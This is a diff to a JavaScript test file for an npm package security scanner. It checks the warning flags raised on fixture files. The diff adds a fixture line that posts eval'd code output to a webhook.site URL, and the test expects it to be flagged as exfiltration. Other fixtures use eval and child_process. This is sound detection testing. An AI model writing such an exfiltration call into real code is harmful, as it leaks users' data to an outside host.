@@ -67,12 +67,13 @@ test('a file\'s flags are what its tags show, alerts by their severity, warnings
   const entry = npmPackageEntry({ name: 'pkg', version: '1.0.0', integrity: 'sha512-flags', manifest: {} })
   const details = npmPackageDetails(entry, { files: [
     ['index.js', 40, 'module.exports = 1\n'], ['run.js', 40, 'eval(code)\nrequire("child_process")\n'], ['README.md', 10, '# pkg\n'],
-    ['dist/a.min.js', 3000, `${'a;'.repeat(1500)}\n`], ['ctl.js', 10, 'x = "‮"\n'], ['logo.png', 4, null],
+    ['dist/a.min.js', 3000, `${'a;'.repeat(1500)}\n`], ['ctl.js', 10, 'x = "‮"\n'], ['logo.png', 4, null], ['send.js', 40, 'post("https://webhook.site/x", eval(code))\n'],
   ] })
   assert.deepEqual(npmFileFlags(details, 'index.js'), [], 'none for what reads as most files do')
   assert.deepEqual(npmFileFlags(details, 'run.js'), [{ name: 'eval', severity: 'high' }, { name: 'child_process', severity: 'high' }])
   assert.deepEqual(npmFileFlags(details, 'ctl.js').map(({ name, severity }) => `${name}:${severity}`), ['Controls:high'])
   assert.deepEqual(npmFileFlags(details, 'logo.png'), [{ name: 'Binary', severity: 'high' }])
+  assert.deepEqual(npmFileFlags(details, 'send.js'), [{ name: 'eval', severity: 'high' }, { name: 'Exfiltration', severity: 'high' }], 'an exfiltration host, as a warning')
   assert.deepEqual(npmFileFlags(details, 'dist/a.min.js').map(({ name, severity }) => `${name}:${severity}`), ['Long lines:notice', 'Minified:notice'])
   assert.deepEqual(npmFileFlags(details, 'index.js', [{ type: 'networkAccess', severity: 'middle' }]), [{ name: 'Network access', severity: 'moderate' }], 'Socket\'s, where the list draws them')
   // What a stasis bundle records of a file, but what it no longer is.
